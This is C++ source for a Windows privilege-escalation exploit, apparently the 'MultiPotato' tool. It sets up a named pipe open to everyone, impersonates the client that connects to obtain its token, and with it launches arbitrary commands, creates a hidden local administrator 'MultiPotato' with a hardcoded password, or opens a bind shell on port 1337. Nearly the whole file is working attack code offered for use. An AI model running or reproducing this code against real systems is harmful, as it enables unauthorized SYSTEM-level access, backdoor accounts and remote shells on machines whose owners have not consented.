#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include <sddl.h>
#include "common.h"
#include <chrono>
#include <thread>
#ifdef UNICODE
#define UNICODE
#endif
#include<windows.h>
#include<Shlobj.h>
#include<lmaccess.h> 
#include<iostream>
#include "Bind.h"

extern wchar_t* commandline;
extern wchar_t* arguments;
extern wchar_t* pipe_placeholder;
char gPipeName[MAX_PATH];


#pragma comment(lib,"netapi32.lib")

void AssignPrivs(HANDLE hToken)
{
	// Enable SE_ASSIGNPRIMARYToken for the Duplicated Token
	bool success = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);

	if (success)
	{
		printf("[+] Assign Primary token Success!!!\n", GetLastError());
	}

	// Enable SE_INCREASE_QUOTA_NAME for the Duplicated Token
	success = EnablePriv(hToken, SE_INCREASE_QUOTA_NAME);

	if (success)
	{
		printf("[+] Assign Increase Quota Name Success!!!\n", GetLastError());
	}
}

void Whoami()
{
	TCHAR username2[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username2, &size);
	printf("[*] Running as user: %S\n", username2);
}

int CreateAdminUser()
{
	LPWSTR username = (LPWSTR)L"MultiPotato";
	LPWSTR password = (LPWSTR)L"S3cretP4ssw0rd!";
	
	
	Whoami();
	/*
	BOOL IsAdmin = IsUserAnAdmin();				// https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-isuseranadmin
	if (!IsAdmin)
	{
		fwprintf(stderr, L"[-] Run as administrator level!");
		exit(EXIT_FAILURE);
	}
	*/
	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;


		ui.usri1_name = username;
		ui.usri1_password = password;
		ui.usri1_priv = USER_PRIV_USER;
		ui.usri1_home_dir = NULL;
		ui.usri1_comment = NULL;
		ui.usri1_flags = UF_SCRIPT;
		ui.usri1_script_path = NULL;


		// use NetUserAdd  specifying level 1
		nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, NULL);
		if (nStatus == NERR_Success)
		{
			fwprintf(stderr, L"[+] User %s has been successfully added with the password %s on localhost\n", username, password);
		}
		else
		{
			fwprintf(stderr, L"[-] A system error has occurred: %d\n", nStatus);
		}
	


	NET_API_STATUS gStatus;
	LOCALGROUP_MEMBERS_INFO_3 gi;
	gi.lgrmi3_domainandname = ui.usri1_name;
	DWORD level = 3;
	DWORD totalentries = 1;

	gStatus = NetLocalGroupAddMembers(NULL, L"Administrators", level, (LPBYTE)&gi, totalentries);
	if (gStatus == NERR_Success)
	{
		fwprintf(stderr, L"[+] User %s has been added into administrators\n", username);
	}
	else
	{
		fwprintf(stderr, L"[-] A system error has occurred: %d\n", gStatus);
	}

	return 0;
}


DWORD WINAPI PipeServer(LPVOID lpParam)
{
	//SEC sec;
	HANDLE  hPipe, hToken;
	BOOL    isConnected;
	SECURITY_ATTRIBUTES     sa;
	BOOL HasAssignPriv = FALSE;
	BOOL success = FALSE;
	HANDLE pToken1, pToken2;
	BOOL b1, b2;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	char buffer[256];
	DWORD dwRead = 0;

	wchar_t pipename[MAX_PATH];
	wcstombs(gPipeName, pipe_placeholder, MAX_PATH - 1);
	wsprintf(pipename, L"\\\\.\\pipe\\%S", gPipeName);

	//LPWSTR PipeName = (LPWSTR)L"\\\\.\\pipe\\pwnme/pipe/srvsvc";
	LPWSTR technique = (LPWSTR)lpParam;
	
	

	//sec.BuildSecurityAttributes(&sa);
	if (!InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION))
	{
		printf("InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());

		return 0;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		printf("ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());

		return 0;
	}



	hPipe = CreateNamedPipe(
		pipename,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		sizeof(DWORD),
		0,
		NMPWAIT_USE_DEFAULT_WAIT,
		&sa);

	if (hPipe == INVALID_HANDLE_VALUE) {


		printf("[-] Error CreatePipe %d", GetLastError());
		return 0;
	}

	printf("[*] Listening on pipe %S, waiting for client to connect\n", pipename);
	isConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	if (isConnected)
	{
		printf("[*] Client connected!\n");
		ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
		if (!ImpersonateNamedPipeClient(hPipe)) {
			printf("[-] Failed to impersonate the client.%d %d\n", GetLastError(), dwRead);
			return 0;
		}
		if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hToken))
		{
			printf("[+] Got user Token!!!\n", GetLastError());
		}

		if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pToken2))
		{
			printf("[-] Error duplicating ImpersonationToken:%d\n", GetLastError());
			

		}
		else
		{
			printf("[*] DuplicateTokenEx success!\n");
		}
		
		printf("[*] Chosen technique is %S, waiting for client to connect\n", technique);
		
		if ((lstrcmpW(technique, L"CreateProcessAsUserW") == 0))
		{


			AssignPrivs(hToken);

			printf("[*] Token authentication using CreateProcessAsUserW for launching: %S\n", commandline);

			//RevertToSelf();

			Whoami();

			b1 = CreateProcessAsUserW(
				hToken,
				commandline,
				arguments,
				NULL,
				NULL,
				FALSE,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&si,
				&pi
			);

			if (b1)
			{
				printf("[+] Successfully created new process \n");

			}
			else
			{
				printf("[*] Result: %d\n", GetLastError());
			}
		}
		else if ((lstrcmpW(technique, L"CreateProcessWithTokenW") == 0))
		{


			printf("[*] Token authentication using CreateProcessWithTokenW for launching: %S\n", commandline);
			if (arguments != NULL)
			{
				printf("[*] Arguments: %S\n", arguments);

			}

			//RevertToSelf();

			//b2 = ImpersonateLoggedOnUser(pToken2);

			b2 = CreateProcessWithTokenW(pToken2,
				0,
				commandline,
				arguments,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&si,
				&pi);

			if (b2)
			{
				printf("[*] Success executing: %S\n", commandline);
			}
			else
			{
				printf("[*] Result: %s (%d)\n", b2 ? "TRUE" : "FALSE", GetLastError());
			}


			if (b2)
			{
				success = TRUE;
				printf("[*] Success impersonating SYSTEM! \n");
			}

		}
		else if ((lstrcmpW(technique, L"CreateUser") == 0))
		{
			AssignPrivs(hToken);
			CreateAdminUser();

		}
		else if ((lstrcmpW(technique, L"BindShell") == 0))
		{
			//AssignPrivs(hToken);
			BindShell bindShell;
			bindShell.Run(1337, pToken2);

		}
		else
		{
			printf("[-] No valid technique choosen!!!\n");
		}

	}
	else

		CloseHandle(hPipe);
	return 1;

}


int CreatePipeServer(wchar_t* technique, bool nostop)
{
	do
	{
		HANDLE hThread1 = NULL;
		DWORD dwThreadId1 = 0;


		printf("[*] Creating Pipe Server thread..\n");
		hThread1 = CreateThread(NULL, 0, PipeServer, technique, 0, &dwThreadId1);

		DWORD dwWait = WaitForSingleObject(hThread1, THREAD_TIMEOUT);

		if (dwWait != WAIT_OBJECT_0)
		{
			wprintf(L"[-] Named pipe didn't received any connect request. Exiting ... \n");
		}
	} while (nostop);
	
	return 1;
}